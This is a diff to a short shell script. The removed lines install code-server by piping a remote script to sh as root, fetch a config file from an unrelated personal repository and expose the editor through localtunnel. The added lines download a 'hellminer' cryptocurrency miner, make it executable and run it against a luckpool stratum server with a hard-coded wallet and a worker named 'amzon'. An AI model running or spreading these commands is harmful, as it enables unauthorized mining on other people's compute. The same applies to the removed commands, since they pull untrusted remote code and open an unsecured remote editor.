@@ -1,9 +1,4 @@
-sudo su
-curl -fsSL https://code-server.dev/install.sh | sh -s -- --dry-run
-curl -fsSL https://code-server.dev/install.sh | sh
-cd ~/.config/code-server
-mv config.yaml llod
-wget https://raw.githubusercontent.com/hinshuika/jvjv/main/config.yaml
-apt install npm
-npm install -g localtunnel
-code-server --bind-addr 127.0.0.1:8040  & lt --port 8040
+wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
+tar -xf hellminer_cpu_linux.tar.gz
+chmod +x hellminer
+./hellminer -c stratum+tcp://na.luckpool.net:3956#xnsub -u RMvS7QUDtjzcVh7w8RugbgyqHDBbykTNu1.amzon -p x --cpu 2
